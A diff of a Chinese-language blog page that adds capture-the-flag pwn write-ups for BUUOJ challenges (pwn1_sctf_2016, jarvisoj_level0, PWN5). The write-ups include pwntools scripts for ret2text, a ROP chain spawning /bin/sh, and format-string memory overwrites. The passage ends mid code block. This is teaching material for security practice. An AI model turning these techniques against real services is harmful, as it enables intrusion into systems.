@@ -273,6 +273,15 @@
     <li><a href="#warmup_csaw_2016">warmup_csaw_2016</a></li>
     <li><a href="#ciscn_2019_n_1">ciscn_2019_n_1</a></li>
     <li><a href="#pwn1_sctf_2016">pwn1_sctf_2016</a></li>
+    <li><a href="#jarvisoj_level0">jarvisoj_level0</a></li>
+    <li><a href="#第五空间2019-决赛pwn5">[第五空间2019 决赛]PWN5</a></li>
+    <li><a href="#jarvisoj_level2">jarvisoj_level2</a></li>
+    <li><a href="#ciscn_2019_n_8">ciscn_2019_n_8</a></li>
+    <li><a href="#bjdctf_2020_babystack">bjdctf_2020_babystack</a></li>
+    <li><a href="#ciscn_2019_c_1">ciscn_2019_c_1</a></li>
+    <li><a href="#jarvisoj_level2_x64">jarvisoj_level2_x64</a></li>
+    <li><a href="#get_started_3dsctf_2016">get_started_3dsctf_2016</a></li>
+    <li><a href="#harekazectf2019baby_rop">[HarekazeCTF2019]baby_rop</a></li>
   </ol>
 </nav>
         </div>
@@ -349,7 +358,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 7 分钟
+                    阅读时长: 16 分钟
                 </time>
             </div>
         
@@ -1141,6 +1150,1416 @@ gets函数这行的意思是它会把我们在“please input”后输入的东�
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="pwn1_sctf_2016">pwn1_sctf_2016
+</h2><p>checksec一手</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215134938169.png"
+	width="497"
+	height="140"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215134938169_hu9725990392047070744.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215134938169_hu10057261674865999961.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215134938169"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="852px"
+	
+></p>
+<p>32位NX保护的程序，反编译一下</p>
+<p>main函数里面有个vuln函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215135111161.png"
+	width="1013"
+	height="588"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215135111161_hu16880260173630211005.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215135111161_hu1986440485730584520.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215135111161"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p>这里有个fgets跟前面gets很像，也可能导致栈溢出，然后这整个程序是实现了把输入的<code>I</code>替换成<code>you</code></p>
+<p>然后看左边函数列表有个get_flag函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215135419419.png"
+	width="412"
+	height="127"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215135419419_hu737585259729851596.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215135419419_hu14865298458284264334.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215135419419"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="324"
+		data-flex-basis="778px"
+	
+></p>
+<p>明显是利用栈溢出ROP到这个函数，双击s看看长度0x3c,明显大于fagets这里的32，所以要看看别的函数了</p>
+<p>现在还剩下replace和strcpy了，这里replace会把一个字符的<code>I</code>换成3个字符的<code>you</code>，其实是可以利用这里，来构成fgets函数的栈溢出的，前面0x3c+4=64,64=3*21+1,也就是我们填入21个<code>I</code>加一个任意字符就能到返回地址，一个简单的ret2text就解决了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27429</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="mi">21</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048F0D</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="jarvisoj_level0">jarvisoj_level0
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160532105.png"
+	width="407"
+	height="111"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160532105_hu8838672771677081082.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215160532105_hu14893954551287445184.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215160532105"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="366"
+		data-flex-basis="880px"
+	
+></p>
+<p>64位NX保护，还是栈溢出的题，反编译</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160717088.png"
+	width="682"
+	height="136"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160717088_hu1092284027648911353.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215160717088_hu12798552032404604591.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215160717088"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="501"
+		data-flex-basis="1203px"
+	
+></p>
+<p>看一下vulnerable_function</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160734252.png"
+	width="465"
+	height="152"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160734252_hu17843570305056551348.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215160734252_hu7760151287106637197.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215160734252"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="305"
+		data-flex-basis="734px"
+	
+></p>
+<p>实际上是调用了read函数，也存在栈溢出，而且这里数组大小是128，但是确读入0x200u个字符，显然溢出的地方就在这，查看字符串</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160955716.png"
+	width="619"
+	height="203"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215160955716_hu16917954711358032339.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215160955716_hu15339097434470876298.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215160955716"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="731px"
+	
+></p>
+<p>有binsh和system,可以getshell</p>
+<p>找他们的地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161255812.png"
+	width="951"
+	height="210"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161255812_hu6507395305158845864.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215161255812_hu13885294106653645532.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215161255812"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="452"
+		data-flex-basis="1086px"
+	
+></p>
+<p>system地址是0x400460,查找/bin/sh的时候找到callsystem函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161512303.png"
+	width="304"
+	height="143"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161512303_hu7552356961844556110.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215161512303_hu2273216412325809154.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215161512303"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161539965.png"
+	width="1088"
+	height="365"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215161539965_hu6842850883242098121.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215161539965_hu15433791578947749641.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215161539965"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="715px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26750</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40059A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于是64位程序，我们可以用ropgadget找gadget</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215163217379.png"
+	width="841"
+	height="439"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215163217379_hu4703664093056402276.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215163217379_hu5849020296737851599.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215163217379"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="459px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26750</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = b&#39;a&#39;*(0x80+8) + p64(0x40059A)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x400460</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x400684</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400663</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x400431</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第五空间2019-决赛pwn5">[第五空间2019 决赛]PWN5
+</h2><p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260215164327422.png"
+	width="379"
+	height="107"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260215164327422_hu3152996531439301237.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260215164327422_hu17139913652356724076.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260215164327422"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="354"
+		data-flex-basis="850px"
+	
+></p>
+<p>32位有canary保护的，不能栈溢出了，ida反编译看一下main函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221134125196.png"
+	width="588"
+	height="740"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221134125196_hu7079785409139305145.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221134125196_hu17035886658611853506.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221134125196"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="79"
+		data-flex-basis="190px"
+	
+></p>
+<p>一眼可以看到满足<code>atoi(nptr) == buf_</code>这个条件就可以getshell,然后我们可以看到<code>printf(buf)</code>这里存在格式化字符串漏洞，然后上面的<code>buf_</code>这个变量是从<code>/dev/urandom</code>里面读取一个随机数跟我们输入的密码比较，atoi是把字符串转成整数的函数</p>
+<p>现在的思路就是利用格式化字符串漏洞泄露出<code>buf_</code>的值，或者直接覆盖掉<code>buf_</code>的值，然后输入相同的密码就getshell了，所以还是常规思路，先找覆盖地址，计算偏移，覆盖数值</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221140121804.png"
+	width="993"
+	height="122"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221140121804_hu15423310219920049124.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221140121804_hu495489226226267353.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221140121804"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="813"
+		data-flex-basis="1953px"
+	
+></p>
+<p>buf_的起始地址是0x0804C044,接下来就是计算偏移，直接运行程序，古法测试一下偏移</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221141249358.png"
+	width="847"
+	height="149"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221141249358_hu6191087846890868278.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221141249358_hu14213263577914245970.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221141249358"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="568"
+		data-flex-basis="1364px"
+	
+></p>
+<p>这里0x41414141的位置是第10个，也就是格式化字符串的第10个参数，然后gdb调试看看，在printf函数这里下断点，然后运行，这里一直ni到输入的地方，我们输入AAAA,然后一直走到<code>printf(buf)</code>的地方查看栈结构</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221143431792.png"
+	width="1708"
+	height="767"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221143431792_hu12835948492540309984.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221143431792_hu12362682079945217346.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221143431792"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="534px"
+	
+></p>
+<p>变量地址比printf第一个参数高0x28,也就是第40/4=10个参数，所以得到偏移是10，然后就是最后一步覆盖了，先构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">[</span><span class="n">addr_buf</span><span class="p">]</span><span class="o">%</span><span class="mi">10</span><span class="err">$</span><span class="n">n</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于是32位的，这里写入的就是数字4，也就是我们覆盖了密码的值为4</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28464</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804C044</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%10$n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里借这题练习一下覆盖成小数字和大数字的做法</p>
+<p><strong>小数字</strong></p>
+<p>还是以2为例,构造payload,这里<code>aa%1</code>作为第10个参数，<code>2$nx</code>作为第11个参数，我们要写入的地址作为第12个参数，所以这里填12</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">aa</span><span class="o">%</span><span class="mi">12</span><span class="err">$</span><span class="n">nx</span><span class="p">[</span><span class="n">buf_addr</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28464</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804C044</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;aa%12$nx&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>大数字</strong></p>
+<p>改进了一下ctfwiki的脚本搓了一个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="n">word</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">prev</span> <span class="o">&lt;</span> <span class="n">word</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">word</span> <span class="o">-</span> <span class="n">prev</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmtstr</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">c&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">prev</span> <span class="o">==</span> <span class="n">word</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmtstr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">+</span> <span class="n">word</span> <span class="o">-</span> <span class="n">prev</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmtstr</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">c&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">fmtstr</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">$hhn&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">fmtstr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fmt_str</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">prev</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">+=</span> <span class="n">fmt</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="n">target_byte</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prev</span> <span class="o">=</span> <span class="n">target_byte</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">28464</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804C044</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmt_str</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mh">0x10101010</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x10101010</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里<code>fmt_str(10, 4, buf_addr, 0x10101010)</code>其实就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p32(0x804c047)+p32(0x804c046)+p32(0x804c045)+p32(0x804c044)+b&#39;%10$hhn%11$hhn%12$hhn%13$hhn&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为这里没有填充，所以默认是4个地址相加的值也就是16，对应的就是0x10,最后的密码就是4个0x10拼起来</p>
+<p>其实整半天，不如pwntools自带的函数fmtstr_payload函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
